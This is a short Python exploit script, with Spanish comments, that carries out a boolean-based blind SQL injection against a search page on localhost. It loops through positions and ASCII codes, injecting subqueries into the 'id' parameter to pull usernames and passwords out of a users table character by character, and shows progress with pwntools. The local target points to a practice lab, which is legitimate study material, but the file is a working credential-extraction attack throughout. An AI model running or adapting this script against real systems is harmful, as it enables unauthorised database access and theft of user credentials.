#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

# CTRL + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchusers.php"
characters = string.printable


def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    extracted_info = ""

    for position in range(1,150):
        for character in range(33,126):
            sqli_url = main_url + "?id=10 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)

            p1.status(sqli_url)        

            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == "__main__":
    makeSQLI()
